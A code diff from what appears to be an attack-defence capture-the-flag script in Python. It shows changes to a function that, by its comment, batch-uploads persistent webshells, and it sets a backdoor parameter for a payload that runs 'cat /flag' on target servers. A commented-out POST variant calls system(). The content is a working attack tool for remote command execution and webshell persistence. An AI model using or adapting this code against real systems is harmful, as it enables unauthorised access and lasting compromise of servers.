@@ -100,7 +100,7 @@ def up_bsshell(ip, port, url_end, method, passwd):  # 批量上传不死马
         if method == 'get':
             data = {passwd: bs_str}
             try:
-                res = requests.get(url, params=data, timeout=3)
+                res = requests.request('GET',url, params=data, timeout=3)
             except:
                 pass
         elif method == 'post':
@@ -136,7 +136,7 @@ def main():
             # server_method = 'post'
             server_url_end = '/index.php'
             server_payload = '?copyright=cat /flag'  # get方式
-            server_passwd = ''  # 现有后门参数
+            server_passwd = 'copyright'  # 现有后门参数
             # server_payload = {'pass': 'shang', 'a': "system('cat /flag');"} #post 方式
             # 开始攻击
             flag_text = attack(server_ip, server_port,
